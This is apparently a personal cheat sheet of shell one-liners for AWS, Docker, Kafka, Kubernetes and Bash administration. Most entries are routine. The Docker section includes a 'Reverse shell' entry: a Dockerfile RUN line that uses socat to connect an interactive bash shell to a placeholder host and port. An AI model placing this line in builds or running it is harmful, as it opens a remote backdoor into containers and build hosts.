## AWS
#### Clone Route53 Zone and modify it for reupload
```
:; HOSTED_ZONE_ID
:; aws route53 list-resource-record-sets --hosted-zone-id $HOSTED_ZONE_ID | jq '. | del(.ResourceRecordSets[] | select(.Type == "NS" or .Type == "SOA")) | .ResourceRecordSets | {"Changes": [{"Action": "CREATE", "ResourceRecordSet": .[]}]}'
```
#### Remove / Update EC2 Security Groups
You can alter this command to add new groups by just appending them to the end
```
:; export INSTANCE_ID=
:; export REMOVE_SG_ID=

:; echo "aws ec2 modify-instance-attribute --instance-id $INSTANCE_ID --groups $(aws ec2 describe-instances --instance-ids $INSTANCE_ID | jq '.Reservations[].Instances[].SecurityGroups' | grep -Po "\"sg-\w+\"" | grep -v $REMOVE_SG_ID | xargs)"
```
#### Find all RDS instances that do not have a particular Security Group(s)
```
:; echo "aws rds describe-db-instances | jq '.[][] | {Instance: .DBInstanceIdentifier, Engine: .Engine, SGs: [.VpcSecurityGroups[].VpcSecurityGroupId]} | select(.Engine != "docdb") | select(.SGs | contains(["ADD-SG-HERE"]) or contains(["ADD-SG-HERE"]) | not) | .Instance'"
```

#### Update CF Stack
This can be easily modified to make changes to the parameter JSON with `jq` or in a file and then uploaded as well.
```
:; export STACK_NAME=

:; RO_PARAMS=$(aws cloudformation describe-stacks --stack-name $STACK_NAME | jq ".Stacks[].Parameters")
:; echo "aws cloudformation update-stack --stack-name $STACK_NAME --parameters $RO_PARAMS --template-body file://<template-here>"
```

## Bash
#### Open file handle counts
```
sudo lsof | awk '{ print $2, $9 }' | sort | uniq -c | sort -n | tail -20
```

## Docker
#### Reverse shell
```
RUN socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host>:<port>
```
#### Join container network namespace for troubleshooting
```
docker run -it --net container:<hash> nicolaka/netshoot
```

## Kafka
#### Print the last 2 messages from a topic
```
:; kafkacat -C -b <broker> -t <topic> -p 0 -o -2 -e
```

## Kubernetes
#### Replace configmaps which aren't actual config maps
```
:; kubectl create configmap <MAP_NAME> --from-file=<DIR_OF_CONFIGS> -o yaml --dry-run | kubectl replace -f -
```


